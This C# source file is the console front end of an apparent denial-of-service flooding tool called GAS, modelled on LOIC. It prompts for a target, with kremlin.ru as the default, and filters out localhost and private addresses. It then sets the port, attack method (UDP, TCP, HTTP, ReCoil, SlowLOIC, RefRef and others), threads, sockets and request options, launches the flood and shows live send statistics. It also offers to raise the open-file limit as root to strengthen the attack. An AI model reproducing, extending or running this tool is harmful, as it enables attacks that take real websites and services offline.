using System;
using System.Collections.Generic;
using System.Threading;
namespace GAS.TUI
{
    class Program
    {
        static string[] Blacklist = new string[] { "epicm.org", "localhost","127.0.0", "192.168."};
        static GAS.Core.Manager Core = new GAS.Core.Manager();
        public static void Main(string[] args)
        {
            string temp;
            if (Environment.OSVersion.Platform.ToString().ToLower().Contains("unix"))
                if (Environment.UserName != "root")
                    Console.Error.WriteLine("You are using Linux/Mac OS and you are not root.\r\nIf you want to use ReCoil/SlowLoic attack you must run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"");
                else
                {
                    Console.WriteLine("Is file open limit unlocked?\r\nIf attack will not give any effect run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\" as root");
                    Console.WriteLine("Do you want to run \"ulimit -n999999\"? [true] (true|false)");
                    if (bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp))
                    {
                        try
                        {
                            System.Diagnostics.Process.Start("ulimit", "-n999999");
                        }
                        catch { }
                    }
                    
                }
            Console.WriteLine("Select target[kremlin.ru]");
            temp = Console.ReadLine();
            temp = (temp == "" ? "kremlin.ru" : temp);
            foreach(string s in Blacklist)
                if (temp.ToLower().Contains(s))
                {
                    Console.WriteLine("U SUK COX");
                    Environment.Exit(666);
                }
            bool IPOK = Core.LockOn(temp);
            if (!IPOK)
            {
                Console.WriteLine("Wrong Target!");
                Environment.Exit(1);
            }
            Console.WriteLine("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite);
            if (Console.ReadLine().ToLower() == "y")
                Core.Subsite = Console.ReadLine();
            Console.WriteLine("Enter port[80]");
            Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
            Console.WriteLine("Select attack type [ReCoil] (UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme)");
            Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
            Console.WriteLine("Enter thread count[50]");
            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
            Console.WriteLine("Enter sockets per thread [50]");
            Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
            Console.WriteLine("Enter delay [0]");
            Core.Delay = int.Parse((temp = Console.ReadLine()) == "" ? "0" : temp);
            Console.WriteLine("Enter timeout[30]");
            Core.Timeout = int.Parse((temp = Console.ReadLine()) == "" ? "30" : temp);
            Console.WriteLine("USE Get [true]");
            Core.USEGet = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("USE GZIP [true]");
            Core.UseGZIP = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Wait    For Response [false] ");
            Core.WaitForResponse = bool.Parse((temp = Console.ReadLine()) == "" ? "false" : temp);
            Console.WriteLine("Append RANDOMC hars [true]");
            Core.AppendRANDOMChars = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Append RANDOM Chars 2 Url [true]");
            Core.AppendRANDOMCharsUrl = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Starting attack");
            Core.Start();
            Console.WriteLine("Attacking...");
            Console.WriteLine("Press Enter stop attack and exit");
            new Thread(new ThreadStart(stats)).Start();
            Console.ReadLine();
            Core.Stop();
        }
        static void stats()
        {
            DateTime d = DateTime.Now;
            Console.WriteLine();
            int x = Console.CursorLeft,y=Console.CursorTop,w=Console.WindowWidth;
            char[] e = new char[w];
            string s;
            int ind = 0;
            for (int i=0;i<w;e[i++]=' ');
            while (true)
            {
                Console.SetCursorPosition(x,y);
                Console.WriteLine(e);
                Console.WriteLine(e);
                Console.SetCursorPosition(x, y);
                Console.WriteLine("Time elapsed\tSent\tReceived\tFailed");
                s = DateTime.Now.Subtract(d).ToString();
                s = s.Substring(0, (ind=s.LastIndexOfAny(new char[]{'.',','}))>0?ind:s.Length);
                Console.WriteLine("{0}\t{1}\t{2}\t\t{3}",s,Core.Requested,Core.Downloaded,Core.Failed);
                Thread.Sleep(500);
            }
        }
    }
}